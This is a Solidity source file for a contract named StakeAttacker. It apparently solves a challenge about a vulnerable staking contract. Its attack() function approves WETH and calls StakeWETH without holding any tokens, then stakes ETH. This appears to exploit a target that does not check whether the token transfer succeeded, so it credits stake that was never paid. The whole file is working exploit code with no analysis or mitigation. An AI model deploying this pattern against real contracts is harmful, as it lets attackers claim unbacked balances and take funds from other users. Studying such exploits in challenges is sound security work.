// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function approve(address spender, uint256 value) external;   
}

interface IStake {
    function StakeETH() external payable;
    function StakeWETH(uint256 amount) external returns (bool);
}

contract StakeAttacker {
    IERC20 public immutable wethTarget;
    IStake public immutable stakeTarget;
    address public immutable stakeAddress;

    constructor(address _wethAddress, address _stakeAddress) {
        wethTarget = IERC20(_wethAddress);
        stakeTarget = IStake(_stakeAddress);
        stakeAddress = _stakeAddress;
    }

    function attack() payable external{
        uint256 amount = 0.0011 ether;
        wethTarget.approve(stakeAddress,amount);
        stakeTarget.StakeWETH(amount);
        stakeTarget.StakeETH{value: msg.value}();
    }
}